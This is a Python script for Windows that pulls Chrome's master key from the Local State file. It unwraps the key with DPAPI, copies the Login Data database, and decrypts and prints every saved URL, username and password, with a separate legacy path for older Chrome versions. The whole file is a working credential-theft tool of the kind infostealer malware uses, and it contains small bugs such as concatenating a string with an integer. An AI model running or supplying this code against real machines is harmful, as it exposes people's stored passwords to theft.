import sqlite3, win32crypt, os, json, base64
from Cryptodome.Cipher import AES
import shutil

"""
Runs on Windows only. Needs Chrome version >= 80.
"""

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    ciphertext = payload[:-16]
    tag = payload[-16:]
    return cipher.decrypt_and_verify(ciphertext, tag)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        # buff is the raw password_value BLOB from the DB
        if buff.startswith(b'v10'):
            iv = buff[3:15]          # 12‑byte IV
            payload = buff[15:]      # ciphertext + 16‑byte tag
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            return decrypted_pass.decode('utf-8', errors='ignore')
        else:
            # Chrome < 80 or DPAPI-only entry
            # fall back to CryptUnprotectData
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"Decryption error: {e}")
        raise
    
master_key = get_master_key()
login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
shutil.copy2(login_db, "Loginvault.db")
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
try:
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        print (f"checking: ${r}")
        url = r[0]
        username = r[1]
        encrypted_pw = r[2]

        print(f"\nRow debug:")
        print(f"URL: {url}")
        print(f"Username: {username}")
        print(f"Raw blob (first 20 bytes): {encrypted_pw[:20]!r}")
        print(f"Blob length: {len(encrypted_pw)}")
        
        try:
            decrypted_pw = decrypt_password(encrypted_pw, master_key)
            print(f"Decrypted pw: {decrypted_pw!r}")
        except Exception as e:
            print(f"Failed to decrypt this row: {e}")
            continue

        if len(username) > 0:
            print ("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_pw + "\n" + "*" + 50 + "\n")
        else:
            print (f"lenght of <${username}> is 0")
except Exception as e:
    pass
cursor.close()
conn.close()
try:
    print ("removing <Loginvault.db>")
    os.remove("Loginvault.db")
except Exception as e:
    pass



def extract_chrome_creds():
    """
    Below run on Windows only. Max Chrome version this works against is v79. 
    """

    userdir = os.path.expanduser("~")
    chromepath = os.path.join(userdir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")

    print (f"userdir: ${userdir}")
    print (f"chromepath: ${chromepath}")

    conn = sqlite3.connect(chromepath)
    c = conn.cursor()
    print("exeucting sql")
    c.execute("SELECT origin_url, username_value, password_value FROM logins;")

    login_data = c.fetchall()
    for URL, username, password in login_data:
        print (password)
        pwd = win32crypt.CryptUnprotectData(password)
        print("%s, %s, %s" % (URL, username, pwd))


